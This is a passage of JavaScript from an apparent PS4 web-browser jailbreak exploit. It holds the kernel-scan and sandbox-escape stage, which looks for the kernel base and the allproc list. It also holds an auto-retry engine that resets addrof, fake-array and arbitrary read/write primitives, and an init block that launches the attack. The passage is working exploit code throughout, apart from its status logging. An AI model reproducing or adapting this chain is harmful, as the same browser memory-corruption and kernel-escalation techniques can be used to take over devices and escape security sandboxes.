        var kbaseOk = probeKernelBaseLoose(kbase, sysent);
        if (!kbaseOk || (allprocList.length === 0 && procCandidates.length <= 2)) {
            mark("KSCAN-SKIP", "kbase-loose=" + kbaseOk + "-allproc=" + allprocList.length + "-cand=" + procCandidates.length);
            mark("SANDBOX-ESCAPE", "FAILED-no-kbase-or-allproc-set-kb=0x...");
            setTimeout(finalizeJailbreak, 0);
            return;
        }
        mark("KSCAN-BEGIN", "candidates=" + procCandidates.length);
        procCandIdx = 0;
        procResolved = false;
        setTimeout(scanProcChunk, 0);
    }

    function startKernelScan() {
        compactLog(40);
        setTimeout(tryAllprocEscapeChunk, 0);
    }

    setTimeout(startKernelScan, 150);
    }
}

// ========== AUTO-RETRY ENGINE ==========
var attemptSucceeded = false;

function cleanupForRetry() {
    try { history.replaceState(undefined, ""); } catch (_) {}
    try { sessionStorage.removeItem(REVISION + ":blocked"); } catch (_) {}
    try { sessionStorage.removeItem(REVISION + ":passed"); } catch (_) {}
    getterCarrier = null;
    preparedSymbolObject = null;
    capturedString = null;
    capturedWords = null;
    fillerGraph = null;
    outerGraph = null;
    rwBuffer = null; rwView = null; rwMirror = null;
    targetBuffer = null; targetView = null;
    globalFakeArray = null;
    referenceTarget = null;
    lengthWord = null;
    predecessorWords = null;
    leakedScope = null;
    for (var i = 0; i < keepAlive.length; i++) keepAlive[i] = null;
    keepIndex = 0;
    captureState = 0;
    hostAddress = NaN; fakeAddress = NaN; targetAddress = NaN;
    rwHeaderOK = false; targetHeaderOK = false;
    readObserved = false; writeObserved = false; restoreObserved = false;
    compositionState = 0;
    retrySafe = false;
}

function scheduleRetry(reason) {
    attemptSucceeded = false;
    if (attemptNumber >= MAX_ATTEMPTS) {
        mark("GIVE-UP", "all-" + MAX_ATTEMPTS + "-attempts-failed last=" + reason);
        mark("ADVICE", "power-cycle-the-ps4-fresh-boot-then-one-clean-load");
        return;
    }
    mark("RETRY", "reason=" + reason + "-next=" + (attemptNumber + 1) + "-of-" + MAX_ATTEMPTS);
    setTimeout(runAttempt, 1500);
}

function runAttempt() {
    attemptNumber++;
    if (attemptNumber > 1) cleanupForRetry();
    updateMeta();
    mark("ATTEMPT", attemptNumber + "-of-" + MAX_ATTEMPTS + "-n=" + DRAIN_COUNT);
    try {
        buildAndStoreGraph();
        prepareAddrof();
    } catch (error) {
        mark("SETUP-THREW", (error && error.name) + ":" + String(error && error.message).slice(0, 80));
        scheduleRetry("setup");
    }
}

// ========== INIT ==========
updateMeta();
renderStages();
mark("BOOT", "rev=" + REVISION + "-k=" + K + "-n=" + DRAIN_COUNT + "-c=" + CARRIER_SLOTS + "-r=" + MAX_ATTEMPTS + "-jb=" + (RUN_JAILBREAK ? "1" : "0") + "-klab=" + (KERNEL_LAB ? "1" : "0") + "-simplejb=" + (SIMPLE_JB ? "1" : "0") + "-mem=" + (MEM_DROP_AFTER_RW ? "drop" : "keep") + "-jbdelay=" + JB_DELAY_MS + "-ksig=" + (FORCE_UCRED_SIG_SCAN ? "1" : "0"));
try {
    runAttempt();
} catch (error) {
    mark("SETUP-THREW", (error && error.name) + ":" + String(error && error.message).slice(0, 80));
}
</script>
